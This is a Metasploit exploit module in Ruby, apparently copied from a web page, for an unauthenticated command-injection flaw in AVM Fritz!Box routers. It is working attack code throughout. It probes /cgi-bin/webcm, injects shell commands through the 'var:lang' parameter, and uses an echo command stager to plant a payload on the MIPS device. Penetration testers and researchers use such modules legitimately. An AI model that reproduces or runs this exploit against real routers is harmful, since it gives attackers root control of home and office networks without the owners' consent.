# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require &#039;msf/core&#039;

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::CmdStagerEcho

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;        => &#039;Fritz!Box Webcm Unauthenticated Command Injection&#039;,
      &#039;Description&#039; => %q{
          Different Fritz!Box devices are vulnerable to an unauthenticated OS command injection.
        This module was tested on a Fritz!Box 7270 from the LAN side. The vendor reported the
        following devices vulnerable: 7570, 7490, 7390, 7360, 7340, 7330, 7272, 7270,
        7170 Annex A A/CH, 7170 Annex B English, 7170 Annex A English, 7140, 7113, 6840 LTE,
        6810 LTE, 6360 Cable, 6320 Cable, 5124, 5113, 3390, 3370, 3272, 3270
      },
      &#039;Author&#039;      =>
        [
          &#039;unknown&#039;, # Vulnerability discovery
          &#039;Fabian Braeunlein <fabian@breaking.systems>&#039;, #Metasploit PoC with wget method
          &#039;Michael Messner <devnull@s3cur1ty.de>&#039; # Metasploit module
        ],
      &#039;License&#039;     => MSF_LICENSE,
      &#039;References&#039;  =>
        [
          [ &#039;OSVDB&#039;, &#039;103289&#039; ],
          [ &#039;BID&#039;, &#039;65520&#039; ],
          [ &#039;URL&#039;, &#039;http://www.kapple.de/?p=75&#039; ],                       #vulnerability details with PoC
          [ &#039;URL&#039;, &#039;https://www.speckmarschall.de/hoere.htm&#039; ],          #probably the first published details (now censored)
          [ &#039;URL&#039;, &#039;http://pastebin.com/GnMKGmZ2&#039; ],                     #published details uncensored from speckmarschall
          [ &#039;URL&#039;, &#039;http://www.avm.de/en/Sicherheit/update_list.html&#039; ], #vendor site with a list of vulnerable devices
          [ &#039;URL&#039;, &#039;http://breaking.systems/blog/2014/04/avm-fritzbox-root-rce-from-patch-to-metasploit-module-ii&#039; ] #wirteup with PoC
        ],
      &#039;DisclosureDate&#039; => &#039;Feb 11 2014&#039;,
      &#039;Privileged&#039;     => true,
      &#039;Platform&#039;       => &#039;linux&#039;,
      &#039;Arch&#039;           => ARCH_MIPSLE,
      &#039;Payload&#039;        =>
        {
          &#039;DisableNops&#039; => true
        },
      &#039;Targets&#039; =>
        [
          [ &#039;Automatic Targeting&#039;, { } ],
        ],
      &#039;DefaultTarget&#039;  => 0
      ))
  end

  def check
    begin
      res = send_request_cgi({
        &#039;uri&#039;    => &#039;/cgi-bin/webcm&#039;,
        &#039;method&#039;  => &#039;GET&#039;
      })

      if res && [200, 301, 302].include?(res.code)
        return Exploit::CheckCode::Detected
      end
    rescue ::Rex::ConnectionError
      return Exploit::CheckCode::Unknown
    end

    Exploit::CheckCode::Unknown
  end

  def execute_command(cmd, opts)
    begin
      res = send_request_cgi({
        &#039;uri&#039;    => &#039;/cgi-bin/webcm&#039;,
        &#039;method&#039; => &#039;GET&#039;,
        &#039;vars_get&#039; => {
          "var:lang" => "&#{cmd}",
        }
      })
      return res
    rescue ::Rex::ConnectionError
      fail_with(Failure::Unreachable, "#{peer} - Failed to connect to the web server")
    end
  end

  def exploit
    print_status("#{peer} - Trying to access the vulnerable URL...")

    unless check == Exploit::CheckCode::Detected
      fail_with(Failure::Unknown, "#{peer} - Failed to access the vulnerable URL")
    end

    print_status("#{peer} - Exploiting...")

    execute_cmdstager(
      :linemax => 90
    )
  end
end

